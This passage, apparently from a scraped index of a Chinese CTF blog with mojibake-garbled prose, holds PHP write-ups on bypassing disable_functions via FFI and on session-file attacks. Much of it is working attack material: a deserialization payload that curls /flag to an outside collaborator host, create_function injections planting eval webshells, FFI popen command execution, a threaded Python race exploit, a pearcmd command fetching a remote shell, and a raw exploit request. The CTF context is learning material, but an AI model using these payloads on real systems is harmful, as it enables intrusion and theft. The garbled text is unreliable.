\u0026#39;start\u0026#39;.\u0026#39;\u0026lt;/br\u0026gt;\u0026#39;; } } $a = new A(); echo base64_encode(serialize($a)); éšååœ¨ä¼ å…¥çš„åœ°æ–¹æ‰§è¡Œunserialize(base64_decode(payload))-\u0026gt;__serialize()['ret']-\u0026gt;system(command);ï¼Œç›´æ¥curlå¤–å¸¦flag\n?a=unserialize(base64_decode(QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319))-\u0026gt;__serialize()[\u0026#39;ret\u0026#39;]-\u0026gt;system(\u0026#34;curl -d @/flag http://fm56ifsleqz363dh864mlhvtzk5atz.burpcollaborator.net\u0026#34;); â€”â€”â€”â€”åœ¨è¿™ä¸ªé¢˜å‡ºç°ä¹‹åèšå‰‘è¿˜ä¸“é—¨å‡ºäº†å¯¹åº”çš„æ’ä»¶\nä½†æ˜¯å¤šæ¬¡å°è¯•å¤±è´¥ï¼Œä¹‹åçœ‹åˆ°äº†è¿™ä¸ªwpä¹‹åå†çœ‹å®˜æ–¹æ–‡æ¡£è¿˜æœ‰è¿™ä¸€ç¯‡å°±æ˜ç™½äº†\né»˜è®¤æƒ…å†µä¸‹FFIåªä¼šè¢«ç”¨äºCLIæ¨¡å¼ä¸‹\u0026amp;é¢„åŠ è½½phpè„šæœ¬ï¼Œé™¤éè®¾ç½®ffi.enable=trueï¼Œè®¾ç½®ä¹‹ååœ¨webshellå°±å¯ä»¥ç›´æ¥ç”¨èšå‰‘æ’ä»¶äº†\n[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp5-FighterFightsInvincibly å¾ˆæ¼‚äº®çš„å‰ç«¯ï¼Œçœ‹é¡µé¢æºç æœ‰æ³¨é‡Šçš„æç¤º\nè¿™ä¸ªå½¢å¼ï¼ŒçœŸçš„æ˜¯ä¸€çœ¼create_function()äº†ï¼Œçœ‹ä¸€ä¸‹phpinfo()ï¼Œç”¨çš„è¿˜æ˜¯create_function()çš„æ³¨å…¥\n?fighter=create_function\u0026amp;fights=\u0026amp;invincibly=;}phpinfo();/* çœ‹ä¸‹disable_function\nsystem,exec,shell_exec,passthru,proc_open,proc_close,\u0026amp;nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,\u0026amp;nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,\u0026amp;nbsp;socket_connect,\u0026amp;nbsp;stream_socket_server,\u0026amp;nbsp;stream_socket_accept,stream_socket_client,ftp_connect,\u0026amp;nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,\u0026amp;nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,\u0026amp;nbsp;posix_getegid,posix_geteuid,posix_getgid,\u0026amp;nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,\u0026amp;nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,\u0026amp;nbsp;posix_getrlimit,\u0026amp;nbsp;posix_getsid,posix_getuid,posix_isatty,\u0026amp;nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,\u0026amp;nbsp;posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname\u0026lt;/td\u0026gt;\u0026lt;td class=\u0026#34;v\u0026#34;\u0026gt;system,exec,shell_exec,passthru,proc_open,proc_close,\u0026amp;nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,\u0026amp;nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,\u0026amp;nbsp;socket_connect,\u0026amp;nbsp;stream_socket_server,\u0026amp;nbsp;stream_socket_accept,stream_socket_client,ftp_connect,\u0026amp;nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,\u0026amp;nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,\u0026amp;nbsp;posix_getegid,posix_geteuid,posix_getgid,\u0026amp;nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,\u0026amp;nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,\u0026amp;nbsp;posix_getrlimit,\u0026amp;nbsp;posix_getsid,posix_getuid,posix_isatty,\u0026amp;nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,\u0026amp;nbsp;posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname ç›´æ¥ä¸ç”¨çœ‹äº†ï¼Œæœ‰ä¸€å¨ï¼Œè‚¯å®šå¾—ç»•è¿‡ï¼›èšå‰‘çš„å„ç§æ’ä»¶éƒ½å¤±è´¥ï¼Œå¾—æ‰‹åŠ¨ç»•ï¼Œffiæ‰©å±•å¼€ç€\nçœ‹åˆ°è¿™é‡Œffi.enable=Onï¼Œç¬¦åˆèšå‰‘æ’ä»¶çš„åº”ç”¨æ¡ä»¶ï¼Œå†™ä¸ªwebshellè¯•è¯•\n?fighter=create_function\u0026amp;fights=\u0026amp;invincibly=;}eval($_POST[wuhu]);/* what\u0026rsquo;s upï¼Œç«Ÿç„¶æ²¡æœ‰å›æ˜¾\nå°è¯•pingï¼Œå‘ç°è¿˜ä¸å‡ºç½‘ï¼Œä¸èƒ½ç”¨curlå¤–å¸¦flag\né‚£åªèƒ½ä»FFIæœ¬èº«ä¸‹æ‰‹äº†ï¼Œè°ƒç”¨cçš„popen ç”¨ç®¡é“è¯»å‘½ä»¤æ‰§è¡Œçš„ç»“æœ\nFILE *popen(const char* command,const char* type); popenä¼šè°ƒç”¨fork()äº§ç”Ÿå­è¿›ç¨‹ï¼Œç„¶åä»å­è¿›ç¨‹ä¸­è°ƒç”¨/bin/sh -cæ¥æ‰§è¡Œå‚æ•°çš„å‘½ä»¤ï¼Œtypeæœ‰r(read)å’Œw(write)ï¼Œä¾ç…§è¿™ä¸ªå€¼popenä¼šå»ºç«‹ç®¡é“è¿æ¥åˆ°å­è¿›ç¨‹çš„æ ‡å‡†è¾“å‡ºè®¾å¤‡æˆ–å†™å…¥åˆ°å­è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥è®¾å¤‡ä¸­\n?fighter=create_function\u0026amp;fights=\u0026amp;invincibly=;}$ffi = FFI::cdef(\u0026#34;void *popen(char*,char*);void pclose(void*);int fgetc(void*);\u0026#34;,\u0026#34;libc.so.6\u0026#34;);$o = $ffi-\u0026gt;popen(\u0026#34;ls / -lah\u0026#34;,\u0026#34;r\u0026#34;);$d = \u0026#34;\u0026#34;;while(($c = $ffi-\u0026gt;fgetc($o)) != -1){$d .= str_pad(strval(dechex($c)),2,\u0026#34;0\u0026#34;,0);}$ffi-\u0026gt;pclose($o);echo hex2bin($d);/* å¦ä¸€ç§æ–¹æ³•æ˜¯è°ƒç”¨phpæºç ä¸­çš„å‡½æ•°php_exec()ï¼Œå½“å®ƒçš„å‚æ•°typeä¸º3æ—¶å¯¹åº”è°ƒç”¨çš„æ˜¯passthru()å‡½æ•°ï¼Œå…¶æ‰§è¡Œå‘½ä»¤å¯ä»¥å°†ç»“æœåŸå§‹è¾“å‡º\n?fighter=create_function\u0026amp;fights=\u0026amp;invincibly=;}$ffi = FFI::cdef(\u0026#34;int php_exec(int type, char *cmd);\u0026#34;);$ffi-\u0026gt;php_exec(3,\u0026#34;ls /\u0026#34;);/* ä½†æ˜¯ï¼Œè¿™é“é¢˜åœ¨buuå¤ç°ä¸äº†ï¼ŒåŸå› æ˜¯uuidæœ‰32ä¸ªå­—ç¬¦ï¼ŒåŠ ä¸Šè¿å­—ç¬¦æœ‰36ä½ï¼Œå†åŠ ä¸Šflag{}æœ‰42ä½ï¼Œä½†æ˜¯/readflagç¨‹åºåªå…è®¸è¯»å‡º37ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æœ€åçš„5ä½æ˜¯è¯»ä¸å‡ºæ¥çš„ï¼ˆè¾£ä¸ªå”¯ä¸€è§£å¯èƒ½æ˜¯çˆ†ç ´çš„ æˆ‘è¯•ç€çˆ†äº†ä¸€ä¼š åŠ å»¶æ—¶å¾—è·‘å¥½ä¹…å¥½ä¹…å¥½ä¹… æ”¾å¼ƒäº†\næœ€è¿‘åœ¨åˆ·buuojï¼Œæœ‰æœ›è¿™ä¸ªæœˆå†…æŠŠ50è§£ä»¥ä¸Šçš„é¢˜åšå®Œæ\nä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ğŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ PHP RFC: Preloading | PHP RFC: FFI - Foreign Function Interface | PHP RFC: New custom object serialization mechanism | PHP FFIè¯¦è§£ - ä¸€ç§å…¨æ–°çš„PHPæ‰©å±•æ–¹å¼\nDo You Hate How Slow Python Is? This Is How You Can Make It Run Faster! | Make Python Faster with CFFI Python Bindings\nCFFI documentation | ctypes documentation\nPython cffiå­¦ä¹  | cffi-example: an example project showing how to use Python\u0026rsquo;s CFFI\nwp | wp2\n","date":"2021-12-03T00:01:07+08:00","permalink":"https://amiaaaz.github.io/2021/12/03/use-ffi-bypass-disable-functions/","section":"posts","tags":["PHP","unserialize","FFI","bypass_disable_functions"],"title":"FFIç»•è¿‡disable_functions"},{"categories":["NOTES\u0026SUMMARY"],"contents":"æåˆ°sessionï¼Œèƒ½æƒ³åˆ°ä»€ä¹ˆæï¼Ÿæ–‡ä»¶ä¸Šä¼ ï¼Œæ¡ä»¶ç«äº‰ï¼ŒsessionåŒ…å«ï¼Œååºåˆ—åŒ–â€¦â€¦ è®©æˆ‘ä»¬ä¸€ç‚¹ç‚¹è¯´\nsessioné…ç½®\u0026amp;ç®€è¿° ä»¥7.4.3ä¸ºä¾‹ï¼Œphp.iniä¸­å…³äºSessionæœ‰å‡ ä¸ªé»˜è®¤é¡¹\nsession.auto_start = 0ï¼šé»˜è®¤ä¸å¯åŠ¨sessionï¼Œ*ä½†æ˜¯å¯ä»¥åœ¨phpè„šæœ¬ä¸­æ‰‹åŠ¨æ‰§è¡Œsession_start()\nsession.save_handler = filesï¼šsessionä»¥æ–‡ä»¶å½¢å¼å­˜å‚¨\nsession.save_path=\u0026quot;\u0026quot;ï¼šsessionæ–‡ä»¶å­˜å‚¨è·¯å¾„ æ–‡ä»¶åä¸ºsess_PHPSESSID\nlinuxä¸‹é»˜è®¤å­˜å‚¨ä½ç½®ï¼›*å¯ä»¥è¢«ä¿®æ”¹\n/var/lib/php/sess_PHPSESSID /var/lib/php/sessions/sess_PHPSESSID /var/lib/php5/sess_PHPSESSID /var/lib/php5/sessions/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID session.serialize_handler = phpï¼šsessionçš„é»˜è®¤åºåˆ—åŒ–å¼•æ“æ˜¯php\nå…¶å®ä¸€å…±æœ‰3ç§ï¼Œ*phpå’Œphp_serializeè¿™ä¸¤ç§æ˜¯å¾ˆå¤šé¢˜çš„å…ƒå‡¶\nåºåˆ—åŒ–å¼•æ“ å­˜å‚¨æ–¹å¼ php é”®å|åºåˆ—åŒ–åå­—ç¬¦ä¸² php_binary é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ï¼ˆä¼šæœ‰ä¸å¯æ˜¾ç¤ºçš„å­—ç¬¦ï¼‰+é”®å+ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼ php_serialize(php\u0026gt;=5.5.4) å°†å­—ç¬¦ä¸²ååºåˆ—åŒ–å¤„ç†å¾—åˆ°çš„æ•°ç»„ session.upload_progress.enabled = Onï¼šå½“æœ‰POSTä¸Šä¼ è¡Œä¸ºæ—¶ï¼Œæ­¤æ¬¡ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯ï¼ˆå¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰ï¼‰éƒ½ä¼šè¢«å­˜å‚¨åˆ°sessionä¸­\nsession.upload_progress.cleanup = Onï¼šå½“POSTä¸Šä¼ å®Œæˆåï¼Œæ­¤æ¬¡çš„sessionæ–‡ä»¶å†…å®¹ä¼šè¢«ç«‹å³æƒ…å†µ\nsession.upload_progress.prefix = \u0026quot;upload_progress_\u0026quot;ï¼šå­˜å…¥sessionæ–‡ä»¶ä¸­çš„å‰ç¼€éƒ¨åˆ†\nsession.upload_progress.name = \u0026quot;PHP_SESSION_UPLOAD_PROGRESS\u0026quot;ï¼šé»˜è®¤nameï¼Œ*å¯æ§å¯åˆ©ç”¨\nsession.use_strict_mode = 0ï¼šè¡¨ç¤ºæˆ‘ä»¬å¯¹Cookieä¸­çš„PHPSESSIDå­—æ®µå¯æ§\næ–‡ä»¶åŒ…å«\u0026amp;æ¡ä»¶ç«äº‰ é»˜è®¤æƒ…å†µä¸‹session.use_strict_mode = 0ï¼Œå½“æˆ‘ä»¬è®¾ç½®äº†Cookieçš„PHPSESSIDå­—æ®µåçš„å€¼valueåï¼Œphpä¼šè‡ªåŠ¨åˆ›å»ºsessionæ–‡ä»¶ï¼ˆé»˜è®¤è·¯å¾„/tmp/sess_PHPSESSIDï¼‰ï¼›æ³¨æ„è¿™ä¸ªè¡Œä¸ºå¹¶ä¸éœ€è¦session.auto_start = Onæˆ–æ˜¯session_start()æ¥æ‰‹åŠ¨å¼€å¯å°±ä¼šè¢«PHPè‡ªåŠ¨åˆå§‹åŒ–ä¸€ä¸ªsessionï¼Œå¹¶å°†prefix+valueå†™å…¥sess_PHPSESSIDæ–‡ä»¶ä¸­ï¼›æ•´ä¸ªæµç¨‹ä¸­valueå¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæ¶æ„çš„payloadåŠ è½½åˆ°sessæ–‡ä»¶ä¸­ç„¶ååŒ…å«ï¼Œå¾—åˆ°rce\nè¿™æ˜¯ä¸€ä¸ªå¸¸è§çš„ä¸Šä¼ è¡¨å•\n\u0026lt;form action=\u0026#34;index.php\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;PHP_SESSION_UPLOAD_PROGRESS\u0026#34; value=\u0026#34;666666\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; å½“ç„¶ä¸€èˆ¬çš„é¢˜ä¸ä¼šæœ‰è¿™ä¹ˆå•çº¯ï¼Œè¿˜ä¼šé…ä¸€ä¸ªé»˜è®¤é¡¹session.upload_progress.cleanup = Onï¼›ä½†æ˜¯å¦‚æœæˆ‘ä»¬æ„é€ ä¸Šä¼ è¡¨å•æ—¶ä¼ çš„æ— ç”¨æ–‡ä»¶å¾ˆå¤§æ—¶å°±å¯ä»¥æ¥ä¸ªé¡¶çº§æ‹‰æ‰¯ï¼ˆæ¡ä»¶ç«äº‰ï¼‰ï¼Œåœ¨å®ƒè¢«æ¸…ç©ºå‰å…ˆåŒ…å«\u0026amp;rce\n[WMCTF2020]Make PHP Great Again å¼€å¹•æºç æš´å‡»\n\u0026lt;?php highlight_file(__FILE__); require_once \u0026#39;flag.php\u0026#39;; if(isset($_GET[\u0026#39;file\u0026#39;])) { require_once $_GET[\u0026#39;file\u0026#39;]; } è¿™ä¸ªé¢˜çš„éé¢„æœŸè§£ï¼šæ–‡ä»¶åŒ…å«+æ¡ä»¶ç«äº‰\nimport io import requests import threading sessid = \u0026#39;AMIZ\u0026#39; data = {\u0026#34;cmd\u0026#34;: \u0026#34;system(\u0026#39;tac /var/www/html/flag.php\u0026#39;);\u0026#34;} def write(session): while True: f = io.BytesIO(b\u0026#39;a\u0026#39; * 100 * 50) session.post(\u0026#39;http://d5ef2f36-5be3-46d5-8c04-301b9ba4f5f7.node4.buuoj.cn:81/\u0026#39;, data={\u0026#39;PHP_SESSION_UPLOAD_PROGRESS\u0026#39;: \u0026#39;\u0026lt;?php eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt;\u0026#39;}, files={\u0026#39;file\u0026#39;: (\u0026#39;amiz.txt\u0026#39;, f)}, cookies={\u0026#39;PHPSESSID\u0026#39;: sessid}) def read(session): while True: resp = session.post(\u0026#39;http://d5ef2f36-5be3-46d5-8c04-301b9ba4f5f7.node4.buuoj.cn:81/?file=/tmp/sess_\u0026#39;+sessid, data=data) if \u0026#39;amiz.txt\u0026#39; in resp.text: print(resp.text) event.clear() else: pass if __name__ == \u0026#34;__main__\u0026#34;: event = threading.Event() with requests.session() as session: for i in range(1, 30): threading.Thread(target=write, args=(session,)).start() for i in range(1, 30): threading.Thread(target=read, args=(session,)).start() event.set() [HXB 2021]easywill willphp v2.1.5ï¼Œæ˜¯åŸºäºtpçš„æ¡†æ¶\n\u0026lt;?php namespace home\\controller; class IndexController{ public function index(){ highlight_file(__FILE__); assign($_GET[\u0026#39;name\u0026#39;],$_GET[\u0026#39;value\u0026#39;]); return view(); } } assign()å¯ä»¥æ§åˆ¶nameå’Œvalueå‚æ•°ï¼Œè€Œç´§è·Ÿç€çš„viewå‡½æ•°æœ‰ç‚¹ä¸œè¥¿\nå¯ä»¥çœ‹åˆ°æœ€åçš„49è¡Œæœ‰æ–‡ä»¶å†™å…¥çš„ç‚¹ï¼Œ51è¡Œæœ‰ä¸ªextract()å¯ä»¥åšåˆ°å˜é‡è¦†ç›–ï¼Œé‚£æˆ‘ä»¬å°±æŠŠfile_put_contentsçš„å‚æ•°æ¢æˆè‡ªå·±æƒ³è¦çš„\n/?name=cfile\u0026amp;value=/etc/passwd å¯ä»¥æ­£å¸¸å›æ˜¾\nä¸è¿‡flagæ–‡ä»¶çš„åå­—å¹¶ä¸æ˜¯flagï¼Œæˆ‘ä»¬å¯ä»¥ç”¨pearcmdå†™shellçš„æ–¹æ³•æ¥ä¸ªwebshellï¼ˆè¯¦ç»†çš„å¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰å†™è¿‡çš„å¦ä¸€ä¸ªé¢˜-\u0026gt;[å¼ºç½‘æ‹Ÿæ€ 2021]Give_me_your_0day\n/?name=cfile\u0026amp;value=/../../../../usr/local/lib/php/pearcmd.php\u0026amp;+install+-R+/tmp+http://101.35.114.107:2301/shell.php ä¸è¿‡è¿™é‡Œè¦æ³¨æ„shellçš„å†™æ³•ï¼Œå¸¸è§„çš„\u0026lt;?php eval($_POST['a']);?\u0026gt;è¿™æ ·çš„æ˜¯ä¸è¡Œçš„ï¼Œä¸‹è½½å°±ä¼šæŠ¥é”™\næ‰§è¡Œä¹Ÿä¼šæŠ¥é”™ï¼Œè¿™é‡Œçš„shellè¦è¿™æ ·å†™\n\u0026lt;?php echo \u0026#39;\u0026lt;?php system(\u0026#34;ls /\u0026#34;);\u0026#39;?\u0026gt; ä¹‹åç›´æ¥æŠŠvalueçš„å€¼æ¢æˆflagæ–‡ä»¶åå³å¯\n/?name=cfile\u0026amp;value=/flag32897328937298hdwidh â€”â€”â€”â€”ä¸è¿‡è¿™é‡Œæˆ‘ç›´æ¥å†™ğŸä¸€ç›´æˆåŠŸä¸äº†ï¼Œåªèƒ½è¿œç¨‹åŒ…å«ğŸ\nâ€”â€”â€”â€”è¯¶ï¼Œè¯´äº†åŠå¤©ï¼Œå…¶å®å’Œæœ¬ç¯‡æœ‰å…³çš„åœ¨éé¢„æœŸçš„ç‚¹ï¼Œå’Œä¸Šé¢çš„è„šæœ¬å‡ ä¹ä¸€æ ·ï¼Œè¦æ”¹çš„åœ°æ–¹åœ¨äºreadéƒ¨åˆ†çš„urläº†\n?name=cfile\u0026amp;value=/tmp/sess_\u0026#39;+sessid ååºåˆ—åŒ– è¿™é‡Œè¯¦ç»†çš„è®²è§£å¯ä»¥å‚ç…§PHPä¸­SESSIONååºåˆ—åŒ–æœºåˆ¶ï¼Œå°±ä¸åšå¤åˆ¶ç²˜è´´å·¥ç¨‹å¸ˆäº†ï¼Œç”¨è‡ªå·±çš„è¯è®²å‡ ä¸ªé‡Œé¢å·²ç»æè¿‡çš„ç‚¹å§\né¦–å…ˆï¼Œè¿™é‡Œçš„é—®é¢˜ï¼ˆæˆ‘ä»¬å¯ä»¥æ”»å‡»çš„åŸå› ï¼‰å‡ºç°åœ¨ä¸¤ç§åºåˆ—åŒ–å¼•æ“æ··ç”¨çš„æƒ…å†µä¸‹ï¼Œå½“æäº¤\n?a=|O:8:\u0026#34;stdClass\u0026#34;:0:{} æ—¶ï¼Œphp_serializeæ–¹å¼ä¸‹ä¼šè¢«å­˜å‚¨ä¸º\na:1:{s:1:\u0026#34;a\u0026#34;;s:20:\u0026#34;|O:8:\u0026#34;stdClass\u0026#34;:0:{}\u0026#34;;} ä½†æ˜¯è¢«phpæ–¹å¼åˆ™ä¼šè§£æä¸º\na:1:{s:1:\u0026#34;a\u0026#34;;s:20:\u0026#34;=O:8:\u0026#34;stdClass\u0026#34;:0:{}\u0026#34;;} åœ¨å…·ä½“åº”ç”¨æ—¶ï¼Œå¯æ§çš„ç‚¹é™¤äº†get/postçš„å‚æ•°ä¹‹å¤–ï¼Œè¿˜å¯ä»¥æ¥ç€æ„é€ æ–‡ä»¶ä¸Šä¼ çš„è¡¨å•ï¼Œé™¤äº†PHPSESSIDä¹‹å¤–çš„åºŸç‰©æ–‡ä»¶çš„æ–‡ä»¶åå°±å¯ä»¥å½“æ­¤å¤§ä»»ï¼Œè®°å¾—åºåˆ—åŒ–å­—ç¬¦å‰é¢è¦åŠ ä¸Š|ï¼Œå†…éƒ¨çš„åŒå¼•å·è¦ç”¨\\è¿›è¡Œè½¬ä¹‰\n[HarekazeCTF2019]Easy Notes è¿™ä¸ªé¢˜å¾—å®¡æºç \næœ‰æ·»åŠ note å¯¼å‡ºnoteçš„åŠŸèƒ½ï¼Œä½†æ˜¯å´ä¸æ˜¯å¸¸è§çš„xssï¼ˆå› ä¸ºæ˜¯phpå†™çš„å˜›ï¼‰ï¼Œä¼šæ£€æµ‹sessionä¸­çš„adminæ˜¯ä¸æ˜¯true\næˆ‘ä»¬çš„çªç ´å£åœ¨å¯¼å‡º.zipè¿™ä¸ªåŠŸèƒ½ä¸Š\næˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨ä¼ªé€ ä¸€ä¸ªsessionæ–‡ä»¶ï¼Œä¹‹åå°†PHPSESSIDè®¾ä¸ºç”Ÿæˆçš„å€¼å³å¯ï¼Œå†…å®¹å‘¢ å°±æ˜¯admin=1\nxxxx|N;admin|b:1;xxxxxx ç”¨xxxx|N;é—­åˆå‰é¢è„æ•°æ®ï¼Œç¼–è¾‘åˆ°titleä¸­ï¼Œå°†sessionçš„PHPSESSIDè®¾ç½®å¥½å°±å¯ä»¥getflagäº†\n[XCTF final 2018]bestphp è¿™é‡Œæ˜¯dockerç¯å¢ƒï¼ˆæ³¨æ„è®¾ç½®æš´éœ²ç«¯å£ å¦å¤–é¦–é¡µçš„index.phpçš„submitè¦æ”¹ä¸€ä¸‹\nè¿™é‡Œæœ‰ç†Ÿæ‚‰çš„call_user_funcï¼Œæ¥è¯»ä¸€ä¸‹admin.phpçš„æºç \n?function=extract\u0026amp;file=php://filter/convert.base64-encode/resource=admin.php hello admin \u0026lt;?php if(empty($_SESSION[\u0026#39;name\u0026#39;])){ session_start(); #echo \u0026#39;hello \u0026#39; + $_SESSION[\u0026#39;name\u0026#39;]; }else{ die(\u0026#39;you must login with admin\u0026#39;); } ?\u0026gt; å†è¯»ä¸€ä¸‹function.phpï¼Œä½†æ˜¯å¥½åƒè¿™ä¿©éƒ½æ²¡å•¥ç”¨\n\u0026lt;?php function filters($data){ foreach($data as $key=\u0026gt;$value){ if(preg_match(\u0026#39;/eval|assert|exec|passthru|glob|system|popen/i\u0026#39;,$value)){ die(\u0026#39;Do not hack me!\u0026#39;); } } } ?\u0026gt; å¾ˆæ˜¾ç„¶æˆ‘ä»¬éœ€è¦åˆ©ç”¨sessionåŒ…å«ï¼Œä½†æ˜¯index.phpä¸­è®¾ç½®äº†open_basedirï¼Œé»˜è®¤çš„sessionè·¯å¾„æ˜¯/var/lib/php/sessions/sess_phpsessidï¼Œä¸è¿‡æœ‰ä¸ªæ–¹å¼å¯ä»¥æ›´æ”¹sessionå­˜å‚¨ç›®å½•\né‚£æˆ‘ä»¬å°±å¯ä»¥æŠŠshellå†™åˆ°webæ ¹ç›®å½•ä¸‹\n?function=session_start\u0026amp;save_path=. POST: name=\u0026lt;?php echo \u0026#34;aaa\u0026#34;;system($_GET[x]);?\u0026gt; ä¸€èˆ¬çš„ä¸€å¥è¯ä¼šæ²¡æ³•æ­£å¸¸å·¥ä½œï¼ˆä¹‹å‰æ¹–æ¹˜æ¯willphpä¹Ÿæ˜¯è¿™æ ·ï¼Œé‚£ä¸ªæ˜¯\u0026lt;?php echo '\u0026lt;?php system(\u0026quot;ls /\u0026quot;);'?\u0026gt;\n?function=extract\u0026amp;file=/var/www/html/sess_qwer\u0026amp;x=ls ?function=extract\u0026amp;file=/var/www/html/sess_qwer\u0026amp;x=cat+fsadgsdagsadgasd.php æ‹¿åˆ°flag\nè§£æ³•2ï¼šphp7.0 - LFI via SegmentFault å‚è€ƒï¼šLFI via SegmentFault\ninclude.php?file=php://filter/string.strip_tags/resource=/etc/passwd string.strip_tagså¯ä»¥å¯¼è‡´phpåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­Segment Fault\nå¦‚æœè¯·æ±‚ä¸­åŒæ—¶å­˜åœ¨ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„è¯·æ±‚ï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šè¢«ä¿ç•™ï¼Œå­˜å‚¨åœ¨/tmp/phpxxxxxxxxxxxï¼ˆxxxxxæ˜¯æ•°å­—+å­—æ¯çš„6ä½æ•°ï¼‰ï¼Œè¿™ä¸ªæ–‡ä»¶è¿ç»­ä¿å­˜ï¼Œä¸ç”¨ç«äº‰ç›´æ¥çˆ†ç ´ï¼ˆå¤šçº¿ç¨‹ä¸Šä¼ æ–‡ä»¶ï¼Œç”Ÿæˆå¤šä¸ªphpxxxxxxxxxxxï¼‰\nåˆ©ç”¨expï¼ˆæ‰“å‡ºæ¥502æ˜¯æ­£å¸¸æƒ…å†µ\nPOST /index.php?function=extract\u0026amp;file=php://filter/string.strip_tags/resource=function.php HTTP/1.1 Host: 101.35.114.107:20004 Content-Length: 1701 Cache-Control: max-age=0 Origin: null Upgrade-Insecure-Requests: 1 DNT: 1 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeScXqSzdW2v22xyk User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7 Cookie: PHPSESSID=17qpuv1r8g19pm503593nddq10 Connection: close ------WebKitFormBoundaryeScXqSzdW2v22xyk Content-Disposition: form-data; name=\u0026#34;fileUpload\u0026#34;; filename=\u0026#34;test.jpg\u0026#34; Content-Type: image/jpeg \u0026lt;?php echo \u0026#34;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww